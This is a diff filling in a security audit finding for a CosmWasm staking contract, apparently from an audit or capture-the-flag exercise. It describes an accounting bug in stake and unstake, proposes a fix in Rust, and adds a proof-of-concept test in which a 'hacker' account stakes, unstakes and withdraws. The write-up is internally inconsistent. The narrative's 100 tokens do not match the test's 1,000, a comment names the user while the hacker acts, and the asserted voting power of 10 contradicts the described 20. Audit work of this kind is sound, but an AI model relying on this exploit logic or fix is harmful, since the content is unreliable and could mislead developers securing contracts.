@@ -96,16 +96,136 @@ fn test_withdraw_accounting() {
 
 ### Description
 
-The bug occurs in ...
+The `total_tokens` variable is updated when a deposit or withdrawal occurs but not when staking or unstaking. As a result, this might cause an accounting / balance discrepancy between the `total_tokens` and `voting_power`.
+
+Suppose a user has 100 tokens and they decide to stake 70 tokens. Now, they have 70 `voting_power` and 100 `total_tokens`. Now, let's say the user unstakes 50 tokens. As per the code, the `voting_power` will be reduced to 20 but the `total_tokens` will still remain at 100. Now, if the user decides to withdraw 90 tokens, they will be able to do so because as per the withdraw function, the `total_tokens` (100) is more than the `voting_power` (20).
+
+After these transactions, the user has 20 `voting_power` but they have withdrawn all their tokens (100 tokens initially deposited - 90 tokens withdrawn = 10 tokens remaining in `total_tokens` but these were staked). The remaining voting power despite having no tokens can result in a discrepancy.
 
 ### Recommendation
 
-The fix should be ...
+This exploit can be resolved by adjusting the `total_tokens` whenever a user stakes or unstakes. The stake function should decrease `total_tokens` by `lock_amount` and the unstake function should increase `total_tokens` by `unlock_amount`. This would ensure that `total_tokens` always reflects the actual number of unstaked tokens a user has and prevent any possible discrepancy.
+
+```rust
+pub fn stake(
+    deps: DepsMut,
+    env: Env,
+    info: MessageInfo,
+    lock_amount: u128,
+) -> Result<Response, ContractError> {
+    // increase voting power
+    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();
+
+    user.voting_power += lock_amount;
+    user.total_tokens -= lock_amount;
+
+    // ...
+}
+
+pub fn unstake(deps: DepsMut,
+    env: Env,
+    info: MessageInfo,
+    unlock_amount: u128,
+) -> Result<Response, ContractError> {
+    // decrease voting power
+    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();
+
+    // check release time
+    if env.block.time < user.released_time {
+        return Err(ContractError::Unauthorized {});
+    }
+
+    user.voting_power -= unlock_amount;
+    user.total_tokens += unlock_amount;
+
+    // ...
+}
+
+```
 
 ### Proof of concept
 
 ```rust
-// code goes here
+#[test]
+fn test_withdraw_accounting() {
+    let (mut app, contract_addr) = proper_instantiate();
+
+    let amount = Uint128::new(1_000);
+
+    app = mint_tokens(app, USER.to_string(), amount);
+    app = mint_tokens(app, HACKER.to_string(), amount);
+    let sender = Addr::unchecked(USER);
+    let hacker = Addr::unchecked(HACKER);
+
+    // deposit funds for user
+    let msg = ExecuteMsg::Deposit {};
+    app.execute_contract(
+        sender.clone(),
+        contract_addr.clone(),
+        &msg,
+        &[coin(amount.u128(), DENOM)],
+    )
+    .unwrap();
+
+    // deposit funds for hacker
+    let msg = ExecuteMsg::Deposit {};
+    app.execute_contract(
+        hacker.clone(),
+        contract_addr.clone(),
+        &msg,
+        &[coin(amount.u128(), DENOM)],
+    )
+    .unwrap();
+
+    // The hacker stakes 70 tokens
+    let res = app.execute_contract(
+        hacker.clone(),
+        contract_addr.clone(),
+        &ExecuteMsg::Stake { lock_amount: 70 },
+        &[],
+    );
+    assert!(res.is_ok());
+
+    // fast forward time
+    app.update_block(|block| {
+        block.time = block.time.plus_seconds(LOCK_PERIOD);
+    });
+
+    // The hacker unstakes 50 tokens
+    let res = app.execute_contract(
+        hacker.clone(),
+        contract_addr.clone(),
+        &ExecuteMsg::Unstake { unlock_amount: 50 },
+        &[],
+    );
+    assert!(res.is_ok());
+
+    // The user withdraws 90 tokens
+    let res = app.execute_contract(
+        hacker.clone(),
+        contract_addr.clone(),
+        &ExecuteMsg::Withdraw {
+            amount: Uint128::from(90u128),
+        },
+        &[],
+    );
+    assert!(res.is_ok());
+
+    // funds are received
+    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
+    assert_eq!(balance, Uint128::from(90u128));
+
+    // query user for voting power
+    // should be 10 tokens, not 20 tokens
+    let msg = QueryMsg::GetVotingPower {
+        user: (&HACKER).to_string(),
+    };
+    let voting_power: u128 = app
+        .wrap()
+        .query_wasm_smart(contract_addr.clone(), &msg)
+        .unwrap();
+    assert_eq!(voting_power, 10_u128);
+}
 ```
 
 ---
